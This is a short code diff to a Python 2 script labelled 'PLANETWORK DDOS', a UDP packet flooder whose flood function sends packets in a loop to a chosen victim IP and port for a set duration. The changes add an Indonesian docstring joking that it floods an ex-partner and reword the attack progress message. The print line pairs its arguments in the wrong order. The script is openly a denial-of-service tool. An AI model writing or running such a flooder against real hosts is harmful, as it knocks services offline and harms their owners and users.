@@ -1,3 +1,5 @@
+"""PLANETWORK DDOS
+Tool untuk melakukan pengiriman packet kepada mantan terindah :'v """
 import time
 import socket
 import random
@@ -21,7 +23,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "Paket Lagi OTW"%(sent, victim, vport)
+        print "Attacking %s sent packages %s at the port %s "%(sent, victim, vport)
 
 def main():
     print len(sys.argv)
